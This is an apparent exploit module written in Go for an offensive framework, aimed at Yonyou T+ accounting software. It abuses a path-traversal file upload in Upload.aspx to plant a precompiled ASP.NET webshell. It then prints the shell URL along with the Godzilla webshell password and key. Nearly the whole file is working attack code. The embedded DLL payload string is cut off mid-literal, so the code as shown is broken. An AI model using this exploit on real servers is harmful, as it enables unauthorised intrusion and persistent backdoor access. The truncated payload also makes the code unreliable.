package exp_yongyouTplus

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"strings"
)

type Exp_Upload struct {
	exp_templates.ExpTemplate
}

func (self *Exp_Upload) Attack_upload1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/tplus/SM/SetupAccount/Upload.aspx?login=1")
	compiled, _ := base64.StdEncoding.DecodeString("77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxwcmVzZXJ2ZSByZXN1bHRUeXBlPSIzIiB2aXJ0dWFsUGF0aD0iLzEuYXNweCIgaGFzaD0iODhlZWM3YjFhIiBmaWxlaGFzaD0iZmZmZmRmNmMzYWU2MmU1MiIgZmxhZ3M9IjExMDAwMCIgYXNzZW1ibHk9IkFwcF9XZWJfbDI1MmR4aW4iIHR5cGU9IkFTUC5fMV9hc3B4Ij4NCiAgICA8ZmlsZWRlcHM+DQogICAgICAgIDxmaWxlZGVwIG5hbWU9Ii8xLmFzcHgiIC8+DQogICAgPC9maWxlZGVwcz4NCjwvcHJlc2VydmU+")
	dll, _ := base64.StdEncoding.DecodeString("
	data := []lzhttp.PostMultiPart{
		{
			"File1",
			"../../../bin/1.aspx.cdcab7d2.compiled",
			"image/jpeg",
			[]byte(compiled),
		},
	}
	// 发送请求
	httpresp := self.HttpPostMultiWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, `UploadFileName`) {
		data := []lzhttp.PostMultiPart{
			{
				"File1",
				"../../../bin/App_Web_l252dxin.dll",
				"image/jpeg",
				[]byte(dll),
			},
		}
		// 发送请求
		httpresp := self.HttpPostMultiWithoutRedirect(target, data, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, `UploadFileName`) {
			shellUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/tplus/1.aspx?login=1")
			self.EchoSuccessMsg("shell: " + shellUrl)
			expResult.Status = true
			self.EchoSuccessMsg("哥斯拉密码：EncryptedData，密钥：8685a970885329ea，CShapDynamicPayload，CSHAP_AES_RAW")
			self.EchoSuccessMsg("自行测试shell")
		} else {
			expResult.Status = false
		}
	} else {
		expResult.Status = false
	}
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_Upload{}, "exp_ Upload.yml")

}
